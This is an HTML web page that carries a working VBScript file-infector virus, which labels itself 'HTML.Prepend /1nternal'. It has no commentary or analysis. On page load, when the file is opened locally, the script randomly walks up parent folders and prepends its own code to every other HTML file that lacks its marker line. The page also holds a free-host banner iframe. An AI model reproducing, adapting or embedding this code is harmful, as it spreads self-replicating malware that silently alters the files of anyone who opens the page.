<html> <!--1nternal-->
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
</head>

<BODY onload="CheckOffline();">
<!-- '"NorthSky"' -->
<!-- Auto Banner Insertion Begin -->
<div align=center><table border=0 cellpadding=0 cellspacing=0>
<tr><td><script><!--
var g=new Date(); g=g.getTime()%1000;
document.writeln('<iframe width=468 height=60 scrolling=no marginwidth=0 marginheight=0 frameborder=0 src=http://v0doo600.8k.com/cgi-bin/b/468/60/dXNlcmJhbm5lcg==/is/'+g+'/></iframe>');
//--></script><noscript><iframe width=468 height=60 scrolling=no marginwidth=0 marginheight=0 frameborder=0 src=http://v0doo600.8k.com/cgi-bin/b/468/60/dXNlcmJhbm5lcg==/in/723/></iframe></noscript></td></tr>
<tr><td><a href=http://v0doo600.8k.com/cgi-bin/fsbar target=_blank><img border=0 height=20 width=468 src=http://v0doo600.8k.com/cgi-bin/fsbar ismap></a></td></tr>
</table><br>
</div><!-- Auto Banner Insertion Complete THANK YOU -->

<script language="VBScript"><!--

Sub CheckOffline
	Randomize
	If location.protocol = "file:" AND (Int((6 * Rnd) + 1) = 1) then Call Offline
End Sub

Sub Offline
	Dim FSO,folder ,fc, f1, cpath
	Set FSO = CreateObject("Scripting.FileSystemObject")
	HostPath = Replace(location.href, "file:///", "")
	HostPath = Replace(HostPath, "/", "\")
	cpath = fso.GetParentFolderName(HostPath)
	Set folder = fso.GetFolder(cpath)

	While folder.IsRootFolder = false 
		Set folder = fso.GetFolder(cpath)
		Set fc = folder.Files
		cpath = fso.GetParentFolderName(cpath)
		For each f1 in fc
			s = Lcase(Fso.GetExtensionName(f1.name))
			if s = "htm" or s = "html" AND f1.path <> HostPath then
				Set fh = fso.opentextfile(f1.path, 1, true)
				TestString = fh.readline
				fh.close
				if TestString <> "<html> <!--1nternal-->" then
					Set fh = fso.opentextfile(HostPath, 1, true)
					TempFile = fso.GetTempName
					fso.CopyFile f1.path, TempFile
					Set fv = fso.opentextfile(f1.path, 2, true)
					For j = 1 to 60
						fv.Writeline fh.ReadLine
					Next
					fh.close
					fv.close
					Set fh = fso.opentextfile(TempFile, 1, true)
					Set fv = fso.opentextfile(f1.path, 8, true)
					Do While fh.AtEndOfStream <> True  
						fv.WriteLine fh.ReadLine
					Loop
					fv.close
					fh.close
					fso.DeleteFile TempFile
				end if
			end if
		Next
	Wend
	window.status = "HTML.Prepend /1nternal"
End Sub
--></script>
</BODY>
</HTML>
